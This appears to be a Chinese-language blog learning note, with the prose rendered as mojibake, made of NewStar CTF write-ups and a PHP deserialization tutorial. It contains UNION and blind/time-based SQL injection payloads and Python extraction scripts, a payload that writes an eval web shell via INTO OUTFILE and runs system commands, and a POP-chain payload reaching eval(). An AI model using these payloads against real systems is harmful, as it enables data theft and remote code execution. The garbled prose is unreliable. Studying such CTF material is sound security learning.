---
title: newstar ctf����
date: 2024-12-02 18:48:16
comments: true
description: ѧϰ��¼
categories:
- sqlע�����֪ʶ
- sqlmap����ʹ��
tags:
- sql����
---

# newstar ctf����

## week1����Ƥ������ flag ��������

�����������`1 and 1=1`��`1 and 1=2`�����ֵڶ�������û����ʾ

˵����������ע�룬����ʹ��UNIONע��

�ȿ�����������

`1 ORDER BY 2`��ȷ��ʾ

`1 ORDER BY 3`����

����Ϊ2

�жϻ���λ��

`-1 UNION SELECT 1,2`

����

```
Name: "1"
Position: "2"
```

���Ա�����

```
-1 union select 1,group_concat(table_name) from information_schema.tables where table_schema=database() --���б�����
-1 union select 1,group_concat(column_name)from information_schema.columns where table_name='Fl4g' --��������
-1 union select 1,group_concat(0x5c,id,0x5c,des,0x5c,value) from Fl4g --����������������
```

���շ���
```
Name: "1"
Position: "\5555\C0ngratu1ati0ns!\flag{NEw5T@r_ctf-Z024e497421ed64}"
```

flag����

## week3-blindsql1

�����������Alice�ܹ����سɼ�

���뵥���Ų�ѯʧ�ܣ������Ա��

```
Alice and 1=1
Alice and 1=2
```

��ʾ�ո񱻽���

��γ��Է���ֻ��äע���������Բ��� and 0 ���� and 1�����Ʒ������������ǲ���äע

����ֱ���������wp�ı��Ʊ�����py�ű�

```python

import requests,string,time

url = 'http://127.0.0.1:9124/'

result = ''
for i in range(1,100):
    print(f'[+] Bruting at {i}')
    for c in string.ascii_letters + string.digits + '_-{}':
        time.sleep(0.2) # �������ʣ���ֹ�������

        print('[+] Trying:', c)

        # ��������ܲ�ѯ����ǰ���ݿ����еı���
        tables = f'(Select(group_concat(table_name))from(infOrmation_schema.tables)where((table_schema)like(database())))'

        # ��ȡ���б����ĵ� i ���ַ��������� ascii ֵ
        char = f'(ord(mid({tables},{i},1)))'

        # ���Ƹ� ascii ֵ
        b = f'(({char})in({ord(c)}))'

        # �� ascii �¶��ˣ��� and ����Ľ���� true���᷵�� Alice ������
        p = f'Alice\'and({b})#'

        res = requests.get(url, params={'student_name': p})

        if 'Alice' in res.text:
            print('[*]bingo:',c)
            result += c
            print(result)
            break
```

�õ�һ��ѱ��������и�secrets��ֱ�ӳ��Ա�������

```python

import requests,string,time

url = 'http://127.0.0.1:9124/'

result = ''
for i in range(1,100):
    print(f'[+] Bruting at {i}')
    for c in string.ascii_letters + string.digits + ',_-{}':
        time.sleep(0.01) # �������ʣ���ֹ�������

        print('[+] Trying:', c)

        tables = f'(Select(group_concat(column_name))from(infOrmation_schema.columns)where((table_name)like(\'secrets\')))'

        char = f'(ord(mid({tables},{i},1)))'

        # ���Ƹ� ascii ֵ
        b = f'(({char})in({ord(c)}))'

        # �� ascii �¶��ˣ��� and ����Ľ���� true���᷵�� Alice ������
        p = f'Alice\'and({b})#'

        res = requests.get(url, params={'student_name': p})

        if 'Alice' in res.text:
            print('[*]bingo:',c)
            result += c
            print(result)
            break
```

��������flag������

```python
import requests,string,time

url = 'http://127.0.0.1:9124/'

result = ''
for i in range(1,100):
    print(f'[+] Bruting at {i}')
    for c in string.ascii_letters + string.digits + ',_-{}':
        time.sleep(0.01) # �������ʣ���ֹ�������

        print('[+] Trying:', c)

        tables = f'(Select(group_concat(secret_value))from(secrets)where((secret_value)like(\'flag%\')))'

        char = f'(ord(mid({tables},{i},1)))'

        # ���Ƹ� ascii ֵ
        b = f'(({char})in({ord(c)}))'

        # �� ascii �¶��ˣ��� and ����Ľ���� true���᷵�� Alice ������
        p = f'Alice\'and({b})#'

        res = requests.get(url, params={'student_name': p})

        if 'Alice' in res.text:
            print('[*]bingo:',c)
            result += c
            print(result)
            break
```

���˰������ڱ����һ��flag

flag{N3wSTar_ctF_Z0Z4171df39d1dc3}

## week4-blindsql2

һ��ʱ��äע��������̽�ˣ�ֱ���Ͻű�sleep��

������(ֱ����wp��)

```python
import requests, string, time

url = 'http://127.0.0.1:2987/'

result = ''
for i in range(1,100):
    print(f'[+]bruting at {i}')
    for c in string.ascii_letters + string.digits + ',_-{}':
        time.sleep(0.01) # �������ʣ���ֹ�������

        print('[+]trying:', c)

        tables = f'(Select(group_concat(table_name))from(infOrmation_schema.tables)where((table_schema)like(database())))'

        # ��ȡ�� i ���ַ��������� ascii ֵ
        char = f'(ord(mid({tables},{i},1)))'

        # ���Ƹ� ascii ֵ
        b = f'(({char})in({ord(c)}))'

        # �� ascii �¶��ˣ���ִ�� sleep(1.5)
        p = f'Alice\'and(if({b},sleep(1.5),0))#'

        res = requests.get(url, params={'student_name':p})

        if res.elapsed.total_seconds() > 1.5:
            print('[*]bingo:', c)
            result += c
            print(result)
            break
```

����secrets����

```php
import requests, string, time

url = 'http://ip:port'

result = ''
for i in range(1,100):
    print(f'[+]bruting at {i}')
    for c in string.ascii_letters + string.digits + ',_-{}':
        time.sleep(0.01) # �������ʣ���ֹ�������

        print('[+]trying:' ,c)

        columns = f'(Select(group_concat(column_name))from(infOrmation_schema.columns)where((table_name)like(\'secrets\')))'

        # ��ȡ�� i ���ַ��������� ascii ֵ
        char = f'(ord(mid({columns},{i},1)))'

        # ���Ƹ� ascii ֵ
        b = f'(({char})in({ord(c)}))'

        # �� ascii �¶��ˣ���ִ�� sleep(1.5)
        p = f'Alice\'and(if({b},sleep(1.5),0))#'

        res = requests.get(url, params={'student_name':p})

        if res.elapsed.total_seconds() > 1.5:
            print('[*]bingo:', c)
            result += c
            print(result)
            break
```

����flag

```python
import requests, string, time

url = 'http://ip:port'

result = ''
for i in range(1,100):
    print(f'[+] bruting at {i}')
    for c in string.ascii_letters + string.digits + ',_-{}':
        time.sleep(0.01) # �������ʣ���ֹ�������

        print('[+] trying:', c)

        flag = f'(Select(group_concat(secret_value))from(secrets)where((secret_value)like(\'flag%\')))'

        # ��ȡ�� i ���ַ��������� ascii ֵ
        char = f'(ord(mid({flag},{i},1)))'

        # ���Ƹ� ascii ֵ
        b = f'(({char})in({ord(c)}))'

        # �� ascii �¶��ˣ���ִ�� sleep(1.5)
        p = f'Alice\'and(if({b},sleep(1.5),0))#'

        res = requests.get(url, params={'student_name':p})

        if res.elapsed.total_seconds() > 1.5:
            print('[*] bingo:', c)
            result += c
            print(result)
            break
```

�����߼�������äע��û����٣��Ͱѷ��ص��߼��жϸ�Ϊ��Ӧʱ�䳤����ȷ���ַ�����ȷ

## week5-sqlshell

���sqlע��һ�ۿ�����ɵ�ˣ��������ݿ�����ô��

�����Ŀ�漰��һ�仰ľ��(web shell)֪ʶ

��ĿΪsqlshell��˵������Ҫ�����ļ��ϴ�(INTO OUTFILE,����ѯ���д��������ϵ�ָ���ļ�)©��

```python
import requests

url = 'http://192.168.109.128:8889'

payload = '\' || 1 union select 1,2,"<?php eval($_GET[1]);" into outfile \'/var/www/html/3.php\'#'

res = requests.get(url,params={'student_name': payload})
res = requests.get(f'{url}/3.php', params={'1': 'system("cat /you_cannot_read_the_flag_directly");'})
print(res.text)
```

# php�����л�

## �����л��������л�

PHP ���л���Serialization���ǽ� PHP ����ת��Ϊ���Դ洢������ַ�����ʽ�Ĺ��̡����л�����ҪĿ���Ǳ��������״̬���Ա�������Ժ��ʱ���ָ���״̬���������ͨ�� serialize() ��������ɡ����л������ݿ��Ա��洢���ļ������ݿ��У������������ϴ��䡣

����ʵ��Ϊ�˽�� PHP ���󴫵ݵ�һ������,��Ϊ PHP �ļ���ִ�н����Ժ�ͻὫ�������٣���ô����´���һ��ҳ��ǡ��Ҫ�õ��ո����ٵĶ���ͻ������޲ߣ��ܲ�������Զ���������٣�������ɣ��������Ǿ������һ���ܳ��ñ������ķ���������� PHP �����л����ǵ������´�Ҫ�õ�ʱ��ֻҪ�����л�һ�¾� ok ��

---

���л�������

�־û��洢�������ӵ����ݽṹ�����������飩���浽�ļ������ݿ��У��Ա��Ժ���Զ�ȡ��ʹ��

���ݽ�����ͨ�����紫������ʱ��ȷ�����ݽṹ��һ���Ժ�������

���棺�����������л���洢�������Ա����ظ����㣬�������
���л��Ĺ���

---

������� serialize() ����ʱ�����᷵��һ����ʾԭʼ�������ַ���������ַ����������㹻����Ϣ��ʹ�ÿ���ͨ�� unserialize() �������仹ԭ��ԭ���ı��������ڶ�����˵�����л����ᱣ����������������ֵ�������ᱣ�淽��

����

```php
<?php
// ����һ������
$data = array("apple", "banana", "orange");

// ���л�����
$serialized_data = serialize($data);

// ������л�����ַ���
echo $serialized_data; // ���: a:3:{i:0;s:5:"apple";i:1;s:6:"banana";i:2;s:6:"orange";}

// ֮������Խ� $serialized_data �洢���ļ������ݿ���
?>
```

### ��������л�

���ڶ���serialize() �ᱣ���������������й�����������Ա������ֵ��˽�г�Ա����Ҳ�ᱻ���棬�������ǻᱻ����������Ϊǰ׺�������ϣ�������л������л�ʱִ���ض��Ĳ��������Զ���ħ������ __sleep() �� __wakeup()��

__sleep()�����������л�֮ǰ���ã���������������Դ��ָ����Щ����Ӧ�ñ����л�

__wakeup()�������󱻷����л�֮����ã������������³�ʼ����Դ

����ٸ�����

```php
<?php

class test{

    public $name = 'P2hm1n';  

    private $sex = 'secret';  

    protected $age = '20';

}

$test1 = new test();

$object = serialize($test1);

print_r($object);

?>
```
������Ϊ`O:4:"test":3:{s:4:"name";s:6:"P2hm1n";s:9:"testsex";s:6:"secret";s:6:"*age";s:2:"20";}`

private�������л���ʱ���ʽ�� %00����%00��Ա��

protected�������л���ʱ���ʽ�� %00*%00��Ա��

>(1)�����ڷ����л���ʱ��һ��Ҫ��֤�ڵ�ǰ�������򻷾����и������
>
>���ﲻ�ò����������л������⣬�����ȼ�˵һ�£������л����ǽ�����ѹ����ʽ���Ķ���ԭ�ɳ�ʼ״̬�Ĺ��̣�������Ϊ�ǽ�ѹ���Ĺ��̣�����Ϊ����û�����л�����������ڷ����л��Ժ��������������ʹ���������Ļ����Ǳ���Ҫ�����������Ҫ�ڵ�ǰ��������ڵ�������
>
>(2)�����ڷ����л�������ʱ��Ҳ�������������Խ��й���
>
>��Ϊû�����л�����������ܿ��Ƶ�ֻ��������ԣ���������Ծ�������Ψһ�Ĺ�����ڣ������ǵĹ��������У����Ǿ���ҪѰ�Һ��ʵ��ܱ����ǿ��Ƶ����ԣ�Ȼ������������Ĵ��ڵķ������ڻ������Ա����Ƶ�����·������ǵķ����л��������������ǹ����ĺ���˼�룬�����Ƚ�˻����׳����������һ��ӡ��

����ٸ������л�����

```php
<?php

$object = 'O:4:"test":3:{s:4:"name";s:6:"P2hm1n";s:9:"testsex";s:6:"secret";s:6:"*age";s:2:"20";}';

$test = unserialize($object1);

print_r($test3);

?>
```

�ؼ����� unserialize():���������л����ַ���ת����PHPֵ

���� protected �� private ���Ե�ʱ��ǵò���յ��ַ���

__wakeup()ħ������

unserialize() �����Ƿ����һ�� __wakeup() ������������ڣ�����ȵ��� __wakeup ������Ԥ��׼��������Ҫ����Դ��

���л�public private protect����������ͬ���

```php
<?php
class test{
    private $test1="hello";
    public $test2="hello";
    protected $test3="hello";
}
$test = new test();
echo serialize($test);  //  O:4:"test":3:{s:11:" test test1";s:5:"hello";s:5:"test2";s:5:"hello";s:8:" * test3";s:5:"hello";}
?>
```

private�Ĳ����������л����� \00test\00test1 
public�Ĳ������ test2 
protected�Ĳ������ \00*\00test3

## �߱������л�©����ǰ��

������ unserailize() ����

unserailize() �����Ĳ�������ɿأ�Ϊ�˳ɹ��ﵽ����������Ĳ�����ʵ�ֵĹ��ܣ�������Ҫ�ƹ�һЩħ������

����ħ������:

```
__construct()����Ĺ��캯��

__destruct()�������������

__call()���ڶ����е���һ�����ɷ��ʷ���ʱ����

__callStatic()���þ�̬��ʽ�е���һ�����ɷ��ʷ���ʱ����

__get()�����һ����ĳ�Ա����ʱ����

__set()������һ����ĳ�Ա����ʱ����

__isset()�����Բ��ɷ������Ե���isset()��empty()ʱ����

__unset()�����Բ��ɷ������Ե���unset()ʱ�����á�

__sleep()��ִ��serialize()ʱ���Ȼ�����������

__wakeup()��ִ��unserialize()ʱ���Ȼ�����������

__toString()���౻�����ַ���ʱ�Ļ�Ӧ����

__invoke()�����ú����ķ�ʽ����һ������ʱ�Ļ�Ӧ����

__set_state()������var_export()������ʱ���˾�̬�����ᱻ���á�

__clone()�������������ʱ����

__autoload()�����Լ���δ�������

__debugInfo()����ӡ���������Ϣ
```

ħ�������ĵ������ڸ������л����߷����л���ͬʱ�Զ���ɵģ�����Ҫ�˹���Ԥ����ͷǳ��������ǵ��뷨�����ֻҪħ�������г�����һЩ���������õĺ��������Ǿ���ͨ�������л��ж���������ԵĲٿ���ʵ�ֶ���Щ�����Ĳٿأ������ﵽ���Ƿ���������Ŀ��

ʾ��

```
<?php 

class test{

    public $target = 'this is a test';

    function __destruct(){

        echo $this->target;

    }

}

$a = $_GET['b'];

$c = unserialize($a);

?>
```

����unserialize() ��������������$a���Կ��ƣ��;߱������÷����л�©����ǰ��

## ��ι���

����Դ����

```php
<?php
class K0rz3n {
    private $test;
    public $K0rz3n = "i am K0rz3n";
    function __construct() {
        $this->test = new L();
    }

    function __destruct() {
        $this->test->action();
    }
}

class L {
    function action() {
        echo "Welcome to XDSEC";
    }
}

class Evil {

    var $test2;
    function action() {
        eval($this->test2);
    }
}

unserialize($_GET['test']);
```

unserialize() �����Ĳ��������ǿ��Կ��Ƶ�

��ͨ������ӿڷ����л��κ���Ķ���

��ǰ��������,���������෴���л��Ժ������û���κ����壬��Ϊ���Ǹ���û���������еķ���

��һ����Ͳ�һ��,��һ��ħ������ __destruct(),�ڶ������ٵ�ʱ���Զ�����,�;��������л������Ķ���

destruct() ����ֻ�õ���һ������ test 

�ٹ۲�һ��,Evil ������з������� action() ���������� eval()

�� K0rz3n ������е� test ���Դ۸�Ϊ Evil �����Ķ���,�۸� Evil ����� test2 ���ԣ�����ĳ����ǵ� Payload

���� payload ���룺

```php
<?php
class K0rz3n {
    private $test;
    function __construct() {
        $this->test = new Evil;
    }
}


class Evil {

    var $test2 = "phpinfo();";

}

$K0rz3n = new K0rz3n;
$data = serialize($K0rz3n);
file_put_contents("seria.txt", $data);
```

ȥ����һ��������Ҫ�۸ĵ������޹ص����ݣ�����������л�������Ȼ�����л��Ľ�����Ƴ�������ոյĴ��뷢���������

`http://127.0.0.1/php_unserialize/K0rz3n.php?test=O:6:"K0rz3n":1:{s:12:"K0rz3ntest";O:4:"Evil":1:{s:5:"test2";s:10:"phpinfo();";}}`

## �ܽ�
(1) Ѱ�� unserialize() �����Ĳ����Ƿ������ǵĿɿص�

(2) Ѱ�����ǵķ����л���Ŀ�꣬�ص�Ѱ�Ҵ��� wakeup() �� destruct() ħ����������

(3) һ��һ����о�������ħ��������ʹ�õ����Ժ����Ե��õķ����������Ƿ��пɿص�������ʵ���ڵ�ǰ���õĹ����д�����

(4) �ҵ�����Ҫ���Ƶ��������Ժ����Ǿͽ�Ҫ�õ��Ĵ��벿�ָ���������Ȼ�������л������𹥻�
